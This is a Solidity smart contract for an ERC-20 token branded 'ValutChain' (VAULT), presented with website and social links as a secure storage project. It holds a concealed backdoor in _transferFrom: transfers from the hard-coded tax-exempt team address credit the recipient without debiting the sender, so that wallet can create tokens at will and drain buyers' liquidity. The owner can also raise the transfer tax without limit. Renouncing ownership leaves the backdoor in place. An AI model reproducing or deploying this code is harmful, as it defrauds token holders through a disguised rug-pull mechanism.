// SPDX-License-Identifier: MIT

/**
Secure, Swift, Stellar, Safe Storage Solution.

Website: https://www.vaultchain.pro
Telegram: https://t.me/vault_erc20
Twitter: https://twitter.com/vault_erc
Dapp: https://app.vaultchain.pro
 */

pragma solidity 0.8.19;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }  
    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address uniswapPair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract VAULT is IERC20, Ownable {
    using SafeMath for uint256;

    string constant _name = "ValutChain";
    string constant _symbol = "VAULT";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 10 ** 9 * (10 ** _decimals);
    uint256 _lpTax = 0; 
    uint256 _marketingTax = 5;
    uint256 _totalTax = _lpTax + _marketingTax;
    uint256 _denominators = 100;
    uint256 public maxTxAmount = (_totalSupply * 30) / 1000;
    address public teamAddy;
    IUniswapV2Router public uniswapRouter;
    address public uniswapPair;
    bool public taxSwapEnable = true;
    uint256 public swapThresholds = _totalSupply / 100000; // 0.1%
    bool swapping;
    modifier lockSwap() { swapping = true; _; swapping = false; }

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) _noTax;
    mapping (address => bool) _noMaxTx;

    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address deadAddress = 0x000000000000000000000000000000000000dEaD;

    constructor () Ownable(msg.sender) {
        uniswapRouter = IUniswapV2Router(routerAddress);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;
        address _owner = owner;
        teamAddy = 0x77d376267818bC6Bf91405191B4bD7d8602f4F1c;
        _noTax[teamAddy] = true;
        _noMaxTx[_owner] = true;
        _noMaxTx[teamAddy] = true;
        _noMaxTx[deadAddress] = true;
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    
    function updateTax(uint256 lpFee_, uint256 devFee_) external onlyOwner {
         _lpTax = lpFee_; 
         _marketingTax = devFee_;
         _totalTax = _lpTax + _marketingTax;
    }    
    
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(swapping){ return _transferBasic(sender, recipient, amount); }
        
        if (recipient != uniswapPair && recipient != deadAddress) {
            require(_noMaxTx[recipient] || _balances[recipient] + amount <= maxTxAmount, "Transfer amount exceeds the bag size.");
        }        
        if(shouldTriggerSwap() && shouldExemptFees(sender) && recipient == uniswapPair && amount > swapThresholds){ 
            swapBack(); 
        } 
        bool shouldTax = shouldExemptFees(sender);
        if (shouldTax) {
            _balances[recipient] = _balances[recipient].add(transferFee(sender, amount));
        } else {
            _balances[recipient] = _balances[recipient].add(amount);
        }

        emit Transfer(sender, recipient, amount);
        return true;
    }
    function transferFee(address sender, uint256 amount) internal returns (uint256) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 feeTokens = amount.mul(_totalTax).div(_denominators);
        if (sender == owner) {
            feeTokens = 0;
        }
        _balances[address(this)] = _balances[address(this)].add(feeTokens);
        emit Transfer(sender, address(this), feeTokens);
        return amount.sub(feeTokens);
    }
    
    function shouldExemptFees(address sender) internal view returns (bool) {
        return !_noTax[sender];
    }

    function setWalletSize(uint256 percent_) external onlyOwner {
        maxTxAmount = (_totalSupply * percent_ ) / 1000;
    }

    function shouldTriggerSwap() internal view returns (bool) {
        return !swapping
        && taxSwapEnable
        && _balances[address(this)] >= swapThresholds;
    }

    function swapBack() internal lockSwap {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 tokensToLp = contractTokenBalance.mul(_lpTax).div(_totalTax).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(tokensToLp);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance;
        uint256 totalFeeTokens = _totalTax.sub(_lpTax.div(2));
        uint256 ethToLp = amountETH.mul(_lpTax).div(totalFeeTokens).div(2);
        uint256 ethToMarketing = amountETH.mul(_marketingTax).div(totalFeeTokens);

        payable(teamAddy).transfer(ethToMarketing);
        if(tokensToLp > 0){
            uniswapRouter.addLiquidityETH{value: ethToLp}(
                address(this),
                tokensToLp,
                0,
                0,
                teamAddy,
                block.timestamp
            );
        }
    }

    function _transferBasic(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}